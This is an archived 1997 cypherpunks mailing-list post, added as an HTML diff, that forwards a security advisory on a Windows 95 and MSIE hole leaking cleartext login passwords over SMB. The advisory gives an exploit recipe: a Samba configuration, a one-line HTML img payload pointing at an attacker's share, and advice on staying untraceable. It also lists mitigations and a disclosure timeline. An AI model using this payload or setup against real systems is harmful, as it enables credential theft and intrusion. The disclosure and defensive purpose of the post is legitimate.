@@ -1,0 +1,290 @@
+<!-- MHonArc v2.4.3 -->
+<!--X-Subject: [LONG] Windows Security (was Re: SecureFile) -->
+<!--X-From-R13: Xrerzrl Pneergg <wrerzrlNirevjro.pbz> -->
+<!--X-Date: Mon, 17 Mar 1997 22:43:17 &#45;0800 (PST) -->
+<!--X-Message-Id: 332E3A3C.65FAC7A4@veriweb.com -->
+<!--X-Content-Type: text/plain -->
+<!--X-Head-End-->
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML//EN">
+<HTML>
+<HEAD>
+<TITLE>[LONG] Windows Security (was Re: SecureFile)</TITLE>
+<LINK REV="made" HREF="mailto:jeremey@veriweb.com">
+</HEAD>
+<BODY>
+<!--X-Body-Begin-->
+<!--X-User-Header-->
+<!--X-User-Header-End-->
+<!--X-TopPNI-->
+<HR>
+[<A HREF="msg00421.html">Date Prev</A>][<A HREF="msg00424.html">Date Next</A>][<A HREF="msg00420.html">Thread Prev</A>][<A HREF="msg00426.html">Thread Next</A>][<A HREF="index.html#00415">Date Index</A>][<A HREF="threads.html#00415">Thread Index</A>]
+<!--X-TopPNI-End-->
+<!--X-MsgBody-->
+<!--X-Subject-Header-Begin-->
+<H1>[LONG] Windows Security (was Re: SecureFile)</H1>
+<HR>
+<!--X-Subject-Header-End-->
+<!--X-Head-of-Message-->
+<UL>
+<LI><em>To</em>: Anand Abhyankar &lt;<A HREF="mailto:anand@querisoft.com">anand@querisoft.com</A>&gt;</LI>
+<LI><em>Subject</em>: [LONG] Windows Security (was Re: SecureFile)</LI>
+<LI><em>From</em>: Jeremey Barrett &lt;<A HREF="mailto:jeremey@veriweb.com">jeremey@veriweb.com</A>&gt;</LI>
+<LI><em>Date</em>: Mon, 17 Mar 1997 22:46:20 -0800</LI>
+<LI><em>CC</em>: <A HREF="mailto:cypherpunks@toad.com">cypherpunks@toad.com</A></LI>
+<LI><em>Organization</em>: VeriWeb Internet Corp.</LI>
+<LI><em>Sender</em>: <A HREF="mailto:owner%2Dcypherpunks@toad.com">owner-cypherpunks@toad.com</A></LI>
+</UL>
+<!--X-Head-of-Message-End-->
+<!--X-Head-Body-Sep-Begin-->
+<HR>
+<!--X-Head-Body-Sep-End-->
+<!--X-Body-of-Message-->
+<PRE>
+-----BEGIN PGP SIGNED MESSAGE-----
+
+I forward this because of the discussion of SecureFile and M$ CryptoAPI, 
+which relies on the security of the windows password to protect keys.
+Fun...
+
+- ------------- Begin forwarded message
+
+ Subject: BoS: <A  HREF="http://www.security.org.il/msnetbreak/">http://www.security.org.il/msnetbreak/</A>
+ Resent-Date: Tue, 18 Mar 1997 16:41:20 +1100 (EST)
+ Resent-From:  best-of-security@suburbia.net
+        Date: Mon, 17 Mar 1997 21:14:02 -0600
+        From: leph One &lt;aleph1@DFW.NET&gt;
+          To: best-of-security@suburbia.net
+
+
+                       WINDOWS 95 AND MSIE SECURITY HOLE
+
+What's new
+
+   It is possible from anywhere on the Internet to obtain the cleartext
+   Windows 95 login password from a Windows 95 computer on a network
+   connected directly to the Internet given only the IP address and the
+   workgroup and leave no trace of your actions. It is untested and may
+   work with Windows For Workgroups as well.
+
+Description
+
+
+
+   There has been recent discussion on security mailing lists concerning
+   the fact that Microsoft Internet Explorer running on Windows NT will
+   automatically try to log in to a remote SMB server (file server)
+   without prompting the user or without the user's knowledge. By
+design,
+   the NT machine will transmit to this remote server the encrypted
+   password and username of the user. This is documented by Aaron
+   Spangler. The caveats with this are that the passwords are encrypted
+   and that in many cases people do not use WWW browsers from NT
+servers,
+   but rather from computers running Windows 95.
+
+   It has been explained that this same exploit does not work against
+   Windows 95 because Windows 95 is only capable of accessing SMB shares
+   (file sharing) if they are:
+     * Connected to the same subnet.
+     * In the Windows 95 computer's LMHOSTS file on startup
+     * Announced to the Windows 95 computer by a Master Browser
+
+
+
+   It is this third and final condition that can be taken advantage of
+to
+   obtain the cleartext password and username of any Windows 95 user who
+   uses Microsoft Internet Explorer. Even careless use of Microsoft
+   Network Neighborhood can exploit this hole without the requirement
+   for Internet Explorer The requirements are knowledge of the user's IP
+   address, workgroup name and that they access a hostile web page. The
+   first two are not difficult to obtain and the third does not have to
+   be an obscure page. In the last 6 months sites such as the CIA have
+   been broken into. All it would require is that one un-noticeable line
+   be added to the home page. Since the viewable content of the page has
+   not been altered, such a change can go unnoticed for a long time.
+
+The Exploit
+
+
+
+   This involves the use of the Unix SMB implementation called Samba.
+   There are no source changes required, but it should be compiled with
+   -DDEBUG_PASSWORD.
+   Samba has an option in the smb.cfg file called remote announce. This
+   allows you to specify a network address (host or broadcast) and
+   workgroup name to inform about your existence. I have configured the
+   [global] section of the smb.conf file like this:
+
+   workgroup = EXPLOIT
+   preferred master = yes
+   domain master = yes
+   security = user
+   debug level = 100
+   remote announce = 10.0.0.255/WORKGROUP
+
+
+
+
+   The only thing that must be changed is the remote announce line. The
+   rest works as-is. A simple share must then be set up such as:
+
+[exploit]
+   path = /tmp
+   public = no
+   browsable = yes
+
+
+
+
+   Nothing needs to be in the directory as nobody will ever see it. For
+   the sake of untractability, change your hostname to something that
+   does not exist, but ensure to create an entry for it in /etc/hosts.
+   This makes your host untraceable unless the network you are
+connecting
+   to monitors network traffic.
+
+   Run smbd. If you are running it from inetd, the process must at least
+   start itself in order to send the broadcast. Using smbclient to
+browse
+   yourself is enough for this. The broadcast gets sent regardless of
+   what smbd was started for.
+
+   At this point if anyone on the target network were to look at their
+   Windows 95 Network Neighborhood they would see the host "EXPLOIT".
+The
+   host is now vulnerable to your attack. While this step may seem a bit
+   obscure and complicated, the truth is that it is very simple. I won't
+   get into details here, but the methods for obtaining the workgroup
+   name are easy to use and readily available. Finding a target network
+   that has not protected ports 137 and 139 is also not so hard. Once
+   you've done that, setting everything up to here takes a very short
+   ammount of time.
+
+   The final and easiest step is to include the following in any html
+   file a user on this network accesses:
+   &lt;img src=file://\\exploit/exploit/t.gif&gt;
+
+   Congratulations!!! You will now see in your Samba log a line such as
+   this:
+   checking user=[user] pass=[INNOCENT]
+
+What does this all mean?
+
+
+
+   The password of any Internet-connected user running Microsoft
+Internet
+   Explorer on Windows 95 obtained be found in cleartext provided that
+   their network administrator has not protected them from accessing
+   external SMB servers by closing ports 139 and 137. If you have
+   obtained the password of a user of a Windows NT server, you can now
+   take the username, password and workgroup and log into that Windows
+NT
+   server. Your true hostname and IP address are not stored in the html
+   file and I am aware of no logging of hosts that enter the browse
+list.
+   This means that you are not traceable, even though they are
+connecting
+   to your machine. If you are lucky, you found the Windows 95 machine
+of
+   the NT administrator and have little work left in order to access the
+   NT server with administrator privileges.
+
+Solutions
+
+
+     * Use Netscape
+     * Use a proxy firewall or packet filter to close off ports 137 and
+       139 from external access to your network, though this still
+leaves
+       you at risk from internal attacks.
+     * Ask Microsoft to rewrite Windows to not send passwords by
+default.
+
+Demonstration
+
+   We're working on software that will allow anyone to try this out and
+   hope to have it finished tomorrow.
+
+Responses / Updates
+
+
+     * March 17, 20:00pm: Microsoft Israel was informed of the problem
+       and requested further information.
+     * March 17, 22:30pm: This document initially completed.
+     * March 17, 00:30am: Final tests with remote sites completed.
+
+Credits
+
+   Discovery by Steve Birnbaum with help from Mark Gazit.
+   Additional support from Yacov Drori and Roman Lasker.
+
+   Thanks also to hobbit for his paper on CIFS, BioH for helping to test
+   this, and anyone else who helped or provided ideas.
+
+  Disclaimer
+
+   The details of this exploit are being released with the interest of
+   security in mind. No malice or harm is intended towards any company
+or
+   organization. We are not responsible for any actions taken based on
+   this information, harmful or otherwise.
+     _________________________________________________________________
+
+- ------------- End forwarded message.
+
+- -- 
+=-----------------------------------------------------------------------= 
+Jeremey Barrett                                  VeriWeb Internet Corp.
+Crypto, Ecash, Commerce Systems                  <A  HREF="http://www.veriweb.com/">http://www.veriweb.com/</A>
+
+PGP Key fingerprint =  3B 42 1E D4 4B 17 0D 80  DC 59 6F 59 04 C3 83 64
+=-----------------------------------------------------------------------=
+
+-----BEGIN PGP SIGNATURE-----
+Version: 2.6.2
+
+iQCVAwUBMy46Ri/fy+vkqMxNAQG5kwQA2Hoeg/W6/So4+YWMlS3f3y+eX/uzFuy3
+mLmqiKPf0B+Pm6KGmoH4FXk7OmlMl8IqN4GJ/mGdzX3Otf4oSxrXsQPuNc688QJI
+F31F7rZTnPtXpIO9IpHvEwqyPksCOsiDJkf0cTFfVygvG2+67c/1OZ3rX/YieLoT
+EnQEsxjUWqk=
+=dQxJ
+-----END PGP SIGNATURE-----
+
+</PRE>
+
+<!--X-Body-of-Message-End-->
+<!--X-MsgBody-End-->
+<!--X-Follow-Ups-->
+<HR>
+<!--X-Follow-Ups-End-->
+<!--X-References-->
+<!--X-References-End-->
+<!--X-BotPNI-->
+<UL>
+<LI>Prev by Date:
+<STRONG><A HREF="msg00421.html">Re: Market Failures, Monocultures, and Dead Legislators</A></STRONG>
+</LI>
+<LI>Next by Date:
+<STRONG><A HREF="msg00424.html">Re: Technology and loss of freedom</A></STRONG>
+</LI>
+<LI>Prev by thread:
+<STRONG><A HREF="msg00420.html">Re: Market Failures, Monocultures, and Dead Legislators</A></STRONG>
+</LI>
+<LI>Next by thread:
+<STRONG><A HREF="msg00426.html">Re: Dead Kids (Oh My!)</A></STRONG>
+</LI>
+<LI>Index(es):
+<UL>
+<LI><A HREF="index.html#00415"><STRONG>Date</STRONG></A></LI>
+<LI><A HREF="threads.html#00415"><STRONG>Thread</STRONG></A></LI>
+</UL>
+</LI>
+</UL>
+
+<!--X-BotPNI-End-->
+<!--X-User-Footer-->
+<!--X-User-Footer-End-->
+</BODY>
+</HTML>
